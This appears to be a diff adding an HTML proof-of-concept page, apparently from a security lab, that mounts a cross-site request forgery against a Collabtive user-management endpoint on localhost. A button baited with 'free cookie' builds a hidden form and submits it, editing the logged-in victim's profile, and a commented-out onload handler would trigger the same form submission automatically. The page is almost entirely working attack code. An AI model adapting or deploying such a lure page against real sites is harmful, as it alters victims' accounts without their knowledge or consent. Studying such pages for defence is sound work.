@@ -1,0 +1,38 @@
+<html>
+<body>
+    <h1>
+        Welcome to the most trusted webpage in the world :)
+    </h1>
+    <br>
+    <button onclick="fill_and_send_form()"> Click here for a free cookie</button>
+    <script>
+        
+        function fill_and_send_form()
+        { 
+            var e = document.createElement("form");
+
+            e.action = "http://localhost/collabtive-31/manageuser.php?action=edit";
+            e.target = "_self"; 
+
+            e.method = "post";
+
+            var form_fields;
+            form_fields += "<input type='text' class='text' value='asd' name='name' id='name' required='1' realname='Name' tabindex='1' />";
+            form_fields += "<input type='file' class='file' name='userfile' id='avatar' realname='File' size='19' onchange='file_avatar.value = this.value;' tabindex='2' />"
+            form_fields += "<input type='text' name='company' id='company' value='aaaaaa' />"
+            e.innerHTML = form_fields;
+
+            document.body.appendChild(e);
+
+            e.submit();
+        }
+
+//        window.onload = function() 
+//        {
+//            fill_and_send_form();
+//
+//        }
+    </script>
+
+</body>
+</html>
